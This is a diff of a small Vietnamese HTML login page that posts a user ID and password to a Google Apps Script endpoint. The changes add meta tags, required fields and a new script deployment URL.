@@ -1,18 +1,21 @@
 <!DOCTYPE html>
-<html>
+<html lang="vi">
 <head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Kiểm tra thông tin</title>
-  <link rel="stylesheet" href="style.css">
+  <link rel="stylesheet" href="style.css"> <!-- Đảm bảo style.css có trong cùng thư mục -->
 </head>
 <body>
   <h1>Nhập thông tin</h1>
   <form id="loginForm">
     <label for="userid">User ID:</label>
-    <input type="text" id="userid" name="userid"><br><br>
+    <input type="text" id="userid" name="userid" required><br><br>
     <label for="password">Password:</label>
-    <input type="password" id="password" name="password"><br><br>
+    <input type="password" id="password" name="password" required><br><br>
     <input type="submit" value="Submit">
   </form>
+  
   <div id="result"></div>
 
   <script>
@@ -21,8 +24,8 @@
       var userId = document.getElementById('userid').value;
       var password = document.getElementById('password').value;
       
-      // Gửi yêu cầu POST đến Google Apps Script
-      fetch('https://script.google.com/macros/s/AKfycbx4piVyxquEa8lyP1NYszJWJiuJhAQcDRbwxVIK5cn2sBg5JPpmAPaeNsekyV3yS9oK/exec', { 
+      // Cập nhật URL mới của Google Apps Script
+      fetch('https://script.google.com/macros/s/AKfycbyFpFOS_kB9WUaj_kixcQud43FmoGXGSTGq8gNsxWKIGyt_lZGTUdu-vLdg-G7ayfQ/exec', { 
         method: 'POST',
         headers: {
           'Content-Type': 'application/json',
